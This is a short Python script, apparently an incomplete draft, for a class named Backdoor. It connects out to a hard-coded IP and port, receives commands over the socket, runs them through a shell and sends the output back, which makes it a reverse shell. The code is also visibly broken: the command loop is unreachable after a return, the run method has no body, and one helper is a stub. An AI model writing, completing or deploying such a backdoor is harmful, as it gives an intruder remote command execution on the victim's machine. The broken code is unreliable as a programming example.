#!usr/bin/python

from sqlite3 import connect
import subprocess
import socket, json

class Backdoor:
    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip,port))
    
    def exe_remort_command(self,command):
        return subprocess.check_output(command,shell=True)
    
        while True:
            command = self.connection.recv(1024)
            result = self.exe_remort_command(command)
            self.connection.send(result)
        self.connection.close()

    def reliable_send(self,send):
        pass

    def run(self):
ip = "192.168.10.8"
port = 4444

backdoor = Backdoor(ip,port)
backdoor.run()